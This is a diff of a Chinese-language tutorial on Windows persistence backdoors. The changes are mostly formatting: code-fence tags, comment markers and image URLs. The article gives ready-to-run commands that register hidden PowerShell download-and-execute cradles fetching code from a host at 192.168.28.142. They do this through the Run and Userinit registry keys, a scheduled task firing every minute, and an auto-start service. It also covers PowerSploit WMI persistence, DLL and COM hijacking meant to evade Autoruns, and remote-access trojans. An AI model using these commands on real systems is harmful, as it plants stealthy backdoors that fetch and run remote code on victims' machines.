@@ -9,7 +9,7 @@
 
 常用的注册表启动键：
 
-```
+```powershell
 # Run键 
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -18,12 +18,16 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
 
-类似的还有很多,关键词：注册表启动键值。
+# 类似的还有很多,关键词：注册表启动键值。
 ```
 
 使用以下命令可以一键实现无文件注册表后门：
 
-`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\"" /f`
+```powershell
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\"" /f
+```
+
+
 
 **Logon Scripts 后门**
 
@@ -37,7 +41,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
 
 利用USERINIT注册表键实现无文件后门：
 
-~~~
+~~~powershell
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
  
 "Userinit"="C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\""
@@ -47,7 +51,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
 
 运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。
 
-![](./image/privilege-4-3.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-3.png)
 
 容易遇到的问题：脚本需全路径，如`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe `
 
@@ -57,7 +61,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
 
 使用以下命令可以一键实现：
 
-~~~
+~~~powershell
 schtasks /create /sc minute /mo 1 /tn "Security Script" /tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\"\"\"http://192.168.28.142:8888/logo.gif\"\"\"))\""
 ~~~
 
@@ -65,7 +69,7 @@ schtasks /create /sc minute /mo 1 /tn "Security Script" /tr "powershell.exe -nop
 
 计划脚本每 1 分钟运行一次。
 
-![](./image/privilege-4-4.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-4.png)
 
 **0x04 服务自启动**
 
@@ -73,23 +77,23 @@ schtasks /create /sc minute /mo 1 /tn "Security Script" /tr "powershell.exe -nop
 
 使用以下命令可实现：
 
-~~~
+~~~powershell
 sc create "KeyName" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\""
 
-sc description  KeyName "Just For Test"   //设置服务的描述字符串
-sc config Name start= auto                //设置这个服务为自动启动
-net start Name                            //启动服务
+sc description  KeyName "Just For Test"   #设置服务的描述字符串
+sc config Name start= auto                #设置这个服务为自动启动
+net start Name                            #启动服务
 ~~~
 
 成功创建了一个自启动服务
 
-![](./image/privilege-4-5.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-5.png)
 
 **0x05 WMI后门**
 
 在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。
 
-~~~
+~~~powershell
 Import-Module .\Persistence\Persistence.psm1
 $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
 $UserOptions = New-UserPersistenceOption -Registry -AtLogon
@@ -104,19 +108,19 @@ Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $Elevated
 
 win7及win7以上系统增加了KnownDLLs保护，需要在注册表：
 
-```
+```powershell
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
 ```
 
 下添加 “lpk.dll” 才能顺利劫持：
 
-![](./image/privilege-4-6.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-6.png)
 
 **0x07 COM劫持**
 
 利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。
 
-![](./image/privilege-4-7.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-7.png)
 
 **0x08 远程控制**
 
@@ -124,7 +128,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKn
 
 一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。
 
-![](./image/privilege-4-8.png)
+![](http://img-upaiyun-own.test.upcdn.net/privilege-4-8.png)
 
 **0x09 结束语**
 
